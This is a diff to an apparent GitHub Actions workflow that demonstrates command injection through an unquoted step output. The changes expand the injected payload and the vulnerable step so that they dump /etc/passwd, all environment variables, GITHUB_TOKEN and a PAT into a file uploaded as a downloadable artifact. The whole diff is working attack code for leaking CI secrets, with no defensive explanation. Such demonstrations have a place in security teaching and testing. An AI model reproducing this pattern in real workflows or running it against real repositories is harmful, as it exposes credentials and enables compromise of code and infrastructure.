@@ -29,7 +29,7 @@ jobs:
       - name: Fake Lint Output
         id: lint
         run: |
-          echo "::set-output name=changed::src/file.js\"; uname -a; whoami; #"
+          echo "::set-output name=changed::src/file.js\"; uname -a; whoami; cat /etc/passwd; env; echo \$GITHUB_TOKEN; echo \$PAT; #"
 
       # 🚨 Vulnerable step (unquoted input used in run)
       - name: Display changed files (vulnerable)
@@ -41,10 +41,18 @@ jobs:
           echo "Changed files are ${{ steps.lint.outputs.changed }}" > output.txt
           uname -a >> output.txt
           whoami >> output.txt
+          echo "==== /etc/passwd ====" >> output.txt
+          cat /etc/passwd >> output.txt
+          echo "==== ENV ====" >> output.txt
+          env >> output.txt
+          echo "==== GITHUB_TOKEN ====" >> output.txt
+          echo "$GITHUB_TOKEN" >> output.txt
+          echo "==== PAT ====" >> output.txt
+          echo "$PAT" >> output.txt
 
-      # 📤 Upload as artifact for download
+      # 📤 Upload output as an artifact
       - name: Upload result file
         uses: actions/upload-artifact@v4
         with:
-          name: command-injection-proof
+          name: command-injection-and-secrets
           path: output.txt
